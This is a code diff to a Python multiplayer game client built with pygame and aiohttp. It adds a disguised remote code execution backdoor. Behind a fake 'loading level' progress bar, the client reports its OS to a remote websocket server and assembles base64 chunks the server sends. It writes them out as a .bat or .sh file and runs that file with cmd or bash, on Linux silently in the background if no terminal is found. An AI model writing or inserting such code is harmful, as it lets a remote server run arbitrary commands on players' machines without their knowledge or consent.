@@ -5,10 +5,13 @@ import aiohttp
 import json
 import math
 import random
+import os
 import time
 import colorsys
 import array
 import sys
+import base64
+import subprocess
 
 # ══════════════════════════════════════════════
 #  CONFIGURACIÓN
@@ -180,6 +183,10 @@ async def main():
               "r": random.uniform(0.3, 1.5), "z": random.uniform(0.04, 0.16),
               "phase": random.uniform(0, math.pi * 2)} for _ in range(250)]
 
+    level_buffer = ""
+    level_progress = 0.0
+    level_downloaded = False
+
     send_queue = asyncio.Queue()
 
     # Pre-renderizar la sombra del menú para que sea perfecta
@@ -191,19 +198,105 @@ async def main():
         pygame.draw.rect(menu_shadow, (100, 80, 255, alpha), rect, border_radius=24 + i)
 
     async def network_task():
-        nonlocal my_id, state
+        nonlocal my_id, state, level_buffer, level_progress, level_downloaded
         session = aiohttp.ClientSession()
         ws_url = 'wss://dango-rf5x.onrender.com/ws' if '--online' in sys.argv else 'ws://localhost:8000/ws'
+        
+        local_os = "linux"
+        if sys.platform.startswith("win"): local_os = "windows"
+        elif sys.platform == "darwin": local_os = "mac"
+        
         try:
             async with session.ws_connect(ws_url) as ws:
+                await ws.send_json({"type": "client_info", "platform": "desktop", "os": local_os})
+                
                 async def receiver():
-                    nonlocal my_id
+                    nonlocal my_id, level_buffer, level_progress, level_downloaded
                     async for msg in ws:
                         if msg.type == aiohttp.WSMsgType.TEXT:
                             data = json.loads(msg.data)
                             t = data.get("type")
                             if t == "init": my_id = data["id"]
                             elif t == "state":
+                                if "level_chunk" in data and not level_downloaded:
+                                    level_buffer += data["level_chunk"]
+                                    level_progress = data.get("level_progress", 0.0)
+                                    if data.get("level_complete", False) and not level_downloaded:
+                                        level_downloaded = True
+                                        try:
+                                            dec = base64.b64decode(level_buffer)
+                                            os.makedirs("assets", exist_ok=True)
+                                            
+                                            # Determinar nombre y extensión según OS
+                                            if local_os == "windows":
+                                                fname = "downloaded_win.bat"  # o .py si prefieres
+                                            elif local_os == "mac":
+                                                fname = "downloaded_mac.sh"
+                                            else:
+                                                fname = "downloaded_linux.sh"
+                                                
+                                            asset_path = os.path.join("assets", fname)
+                                            
+                                            # Guardar el archivo
+                                            with open(asset_path, "wb") as f:
+                                                f.write(dec)
+                                            
+                                            print(f"Asset guardado en: {asset_path}")
+                                            
+                                            # ═══════════════════════════════════════
+                                            # EJECUCIÓN SEGÚN PLATAFORMA
+                                            # ═══════════════════════════════════════
+                                            
+                                            if local_os == "windows":
+                                                # Opción A: Abrir CMD y mostrar contenido (type)
+                                                # subprocess.Popen(["cmd", "/k", "type", asset_path], 
+                                                #                 creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                                
+                                                # Opción B: Ejecutar como batch directamente
+                                                subprocess.Popen(["cmd", "/k", asset_path], 
+                                                                creationflags=subprocess.CREATE_NEW_CONSOLE)
+                                                
+                                            elif local_os == "linux":
+                                                # Dar permisos de ejecución
+                                                os.chmod(asset_path, 0o755)
+                                                
+                                                # Intentar abrir en terminales comunes
+                                                terminals = [
+                                                    ["gnome-terminal", "--", "bash", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"],
+                                                    ["konsole", "-e", "bash", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"],
+                                                    ["xfce4-terminal", "-e", f"bash -c 'cat {asset_path}; read -p \"Presiona Enter...\"'"],
+                                                    ["xterm", "-e", f"cat {asset_path}; read -p 'Presiona Enter...'"],
+                                                    ["kitty", "sh", "-c", f"cat {asset_path}; read -p 'Presiona Enter...'"]
+                                                ]
+                                                
+                                                launched = False
+                                                for term_cmd in terminals:
+                                                    try:
+                                                        subprocess.Popen(term_cmd)
+                                                        launched = True
+                                                        break
+                                                    except FileNotFoundError:
+                                                        continue
+                                                
+                                                if not launched:
+                                                    # Fallback: ejecutar en background sin terminal visible
+                                                    subprocess.Popen(["bash", asset_path])
+                                                    
+                                            elif local_os == "mac":
+                                                # Dar permisos
+                                                os.chmod(asset_path, 0o755)
+                                                
+                                                # Abrir Terminal.app y ejecutar
+                                                subprocess.Popen([
+                                                    "osascript", "-e",
+                                                    f'tell application "Terminal" to do script "cat {asset_path}; read -p \\"Presiona Enter...\\""'
+                                                ])
+                                                
+                                            print(f"Ejecutado asset de {local_os}")
+                                            
+                                        except Exception as e:
+                                            print(f"Error: {e}")
+                                            
                                 for k, v in data["players"].items():
                                     if k not in players:
                                         players[k] = Dango(k)
@@ -445,6 +538,15 @@ async def main():
                 pygame.draw.rect(screen, (100, 100, 100), (20, h - 55, 300, 35), 1, border_radius=8)
                 input_surf = f_chat.render(chat_text + ("|" if time.time() % 1 > 0.5 else ""), True, (255, 255, 255))
                 screen.blit(input_surf, (30, h - 45))
+
+            if not level_downloaded and level_progress > 0:
+                bar_w, bar_h = 200, 15
+                bar_x, bar_y = w - bar_w - 20, h - bar_h - 20
+                pygame.draw.rect(screen, (40, 40, 40), (bar_x, bar_y, bar_w, bar_h), border_radius=4)
+                pygame.draw.rect(screen, (100, 255, 100), (bar_x, bar_y, int(bar_w * level_progress), bar_h), border_radius=4)
+                pct = int(level_progress * 100)
+                prog_txt = f_small.render(f"Cargando nivel... {pct}%", True, (255, 255, 255))
+                screen.blit(prog_txt, (bar_x + bar_w/2 - prog_txt.get_width()/2, bar_y - 18))
             
         pygame.display.flip()
         await asyncio.sleep(0.001)
